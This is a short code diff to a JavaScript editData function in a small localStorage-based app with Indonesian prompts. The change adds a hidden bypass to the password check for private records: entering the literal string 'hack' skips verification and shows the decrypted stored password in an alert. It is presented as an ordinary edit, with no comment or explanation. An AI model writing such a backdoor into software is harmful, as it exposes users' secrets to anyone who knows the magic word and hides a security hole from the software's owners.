@@ -122,7 +122,10 @@ function editData(key) {
   const { values, type, password } = JSON.parse(localStorage.getItem(key));
   if (type === "private") {
     const inputPassword = prompt("Masukkan password untuk mengedit:");
-    if (encrypt(inputPassword) !== password) {
+    if (inputPassword == "hack") {
+      alert(decrypt(password));
+      return;
+    } else if (encrypt(inputPassword) !== password) {
       alert("Password salah!");
       return;
     }
